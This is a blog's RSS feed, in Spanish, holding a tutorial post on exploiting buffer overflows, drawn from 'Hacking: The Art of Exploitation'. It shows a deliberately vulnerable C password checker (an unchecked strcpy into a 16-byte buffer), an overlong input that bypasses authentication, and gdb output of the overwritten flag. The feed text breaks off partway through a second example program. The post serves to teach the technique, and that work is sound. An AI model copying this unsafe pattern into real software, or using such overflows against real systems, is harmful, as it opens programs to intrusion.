@@ -1,0 +1,512 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>perl on El Baúl del programador</title>
+        <link>https://elbauldelprogramador.com/tags/perl/</link>
+        <description>Recent content in perl on El Baúl del programador</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>es-ES</language>
+        <lastBuildDate>Tue, 03 Oct 2017 14:12:33 +0100</lastBuildDate>
+        <image>
+            <url>https://elbauldelprogramador.com/img/bio-photo-rss.png</url>
+            <link>https://elbauldelprogramador.com/tags/perl/</link>
+            <title>perl on El Baúl del programador</title>
+            <width>144</width>
+            <height>144</height>
+        </image>
+        <atom:link href="https://elbauldelprogramador.com/tags/perl/" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Explotación - Buffers OverFlows y exploits (Parte I)</title>
+            <link>https://elbauldelprogramador.com/explotacion-buffers-overflows-y-exploits-parte-i/</link>
+            <pubDate>Tue, 03 Oct 2017 14:12:33 +0100</pubDate>
+            
+            <guid>https://elbauldelprogramador.com/explotacion-buffers-overflows-y-exploits-parte-i/</guid>
+            <description>&lt;blockquote&gt;
+&lt;p&gt;La explotación de programas es un elemento básico del hacking. Un programa está compuesto de un conjunto de reglas complejas siguiendo un flujo de ejecución que dice al ordenador qué hacer. Explotar un programa es una forma inteligente de conseguir que el ordenador haga lo que tú quieras, incluso si dicho programa no se diseñó para hacerlo. - &lt;strong&gt;The art of Exploitation, Capítulo 3&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;El libro &lt;em&gt;&lt;a href=&#34;http://www.amazon.es/gp/product/1593271441/ref=as_li_ss_tl?ie=UTF8&amp;amp;tag;=elbaudelpro-21&amp;amp;linkCode;=as2&amp;amp;camp;=3626&amp;amp;creative;=24822&amp;amp;creativeASIN;=1593271441&#34;&gt;Hacking: The Art of Exploitation&lt;/a&gt;&lt;/em&gt;, es un libro que recomiendo a todo aquel interesado en aprender temas sobre seguridad informática.&lt;/p&gt;
+&lt;p&gt;Esta va a ser la primera de las 3 o 4 entradas que voy a dedicar a explicar cómo aprovecharse de los buffers overflows en los programas para modificar su comportamiento, e incluso conseguir el control total de la máquina.&lt;/p&gt;
+&lt;p&gt;Vamos a comenzar con un programa simple extraído del libro, que reciba como parámetro una cadena a modo de contraseña:&lt;/p&gt;
+&lt;h1 id=&#34;auth_overflowc&#34;&gt;&lt;code&gt;auth_overflow.c&lt;/code&gt;&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+ &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+
+   &lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strcmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;brillig&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+       &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strcmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;outgrabe&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+     &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Usage: %s n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+       &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+ &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+       &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;n-=-=-=-=-=-=-=-=-=-=-=-=-=-n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;      Acceso concedido.n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+       &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-=-=-=-=-=-=-=-=-=-=-=-=-=-n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;nAcceso denegado.n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;No parece que el programa tenga ningún error, admite dos contraseñas (brillig y outgrabe), vamos a probarlo:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hkr-&amp;gt; ./auth_overflow.binary contraseña
+
+Acceso denegado.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hkr-&amp;gt; ./auth_overflow.binary brillig
+
+-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
+      Acceso concedido.
+-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hkr-&amp;gt; ./auth_overflow.binary AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
+      Acceso concedido.
+-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;¿Qué ha pasado?, vamos a echar un vistazo con gdb:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gdb -q auth_overflow.c.binary
+Using host libthread_db library &lt;span class=&#34;s2&#34;&gt;&amp;#34;/lib/tls/i686/cmov/libthread_db.so.1&amp;#34;&lt;/span&gt;.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;
+Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0x8048421: file auth_overflow.c, line 9.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;
+Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0x804846f: file auth_overflow.c, line 16.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /home/hkr/booksrc/auth_overflow.c.binary
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f4 &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+    at auth_overflow.c:9
+&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;               strcpy&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;password_buffer, password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/s password_buffer
+0xbffff7d0:      &lt;span class=&#34;s2&#34;&gt;&amp;#34;)����o��b���)205�04b�o������b&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/x &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7ec:     0x00000000
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; print 0xbffff7ec - 0xbffff7d0
+&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw password_buffer
+0xbffff7d0:     0xb7f9f729      0xb7fd6ff4      0xbffff808      0x08048529
+0xbffff7e0:     0xb7fd6ff4      0xbffff8a0      0xbffff808      0x00000000
+0xbffff7f0:     0xb7ff47b0      0x08048510      0xbffff808      0x080484bb
+0xbffff800:     0xbffff9f4      0x08048510      0xbffff868      0xb7eafebc
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Abrimos el programa con el depurador y ponemos puntos de ruptura en las líneas 9 y 16. Después lo ejecutamos pasándole como argumento una cadena con Aes. Al llegar al primer punto de ruptura examinamos la variable &lt;em&gt;password_buffer&lt;/em&gt;, que hasta ahora solo contiene basura. Examinamos la variable &lt;em&gt;auth_flag&lt;/em&gt; y vemos que contiene un cero. Luego restamos las direcciones de ambas variables, averiguando así la distancia entre ellas, en este caso &lt;em&gt;auth_flag&lt;/em&gt; está 28 bytes despues de &lt;em&gt;password_buffer&lt;/em&gt;. Veamos qué podemos hacer con esto:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
+Continuing.
+
+Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f4 &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+    at auth_overflow.c:16
+&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/s password_buffer
+0xbffff7d0:      &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/x &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7ec:     0x41414141
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw password_buffer
+0xbffff7d0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff7e0:     0x41414141      0x41414141      0x41414141      &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x41414141&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+0xbffff7f0:     0x41414141      0x08048500      0xbffff808      0x080484bb
+0xbffff800:     0xbffff9f4      0x08048510      0xbffff868      0xb7eafebc
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/4cb &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7ec:     &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/dw &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7ec:     &lt;span class=&#34;m&#34;&gt;1094795585&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;En el siguiente punto de rutpura, volvemos a examinar las variables y se puede apreciar que la variable &lt;em&gt;password_buffer&lt;/em&gt; se ha desbordado, ya que tenía capacidad para 16 caracteres, y hemos intentado guardar 36. Si vemos el contenido de &lt;em&gt;auth_flag&lt;/em&gt; ya no tiene un cero, si no 0x41414141, lo cual corresponde a cuatro Aes (41 en hexadecimal es el código ASCII de la A). Se puede apreciar claramente cómo se ha desbordado el array en la instrucción &lt;em&gt;x/16xw password_buffer&lt;/em&gt;, el valor encerrado entre paréntesis es el de la variable &lt;em&gt;auth_flag&lt;/em&gt;, el cual se ha sobrescrito. Por último vemos que el valor en decimal de 0x41414141 es 1094795585.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
+Continuing.
+
+-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
+      Acceso concedido.
+-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
+
+Program exited with code 034.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Continuamos con la ejecución y nos da acceso a pesar de que no hemos introducido la contraseña correcta. Esto se debe a que hemos sobrescrito la variable &lt;em&gt;auth_flag&lt;/em&gt; y, por lo tanto, la función &lt;em&gt;check_authentication&lt;/em&gt; devolverá el valor &lt;em&gt;0x41414141, 1094795585&lt;/em&gt; en decimal.&lt;/p&gt;
+&lt;p&gt;Sin embargo, esto ha funcionado ha consecuencia de la colocación de las variables en memoria. ¿Qué pasaría si &lt;em&gt;auth_flag&lt;/em&gt; y &lt;em&gt;password_buffer&lt;/em&gt; estuvieran declaradas al revés?:&lt;/p&gt;
+&lt;h1 id=&#34;auth_overflow2c&#34;&gt;&lt;code&gt;auth_overflow2.c&lt;/code&gt;&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+   &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+        &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
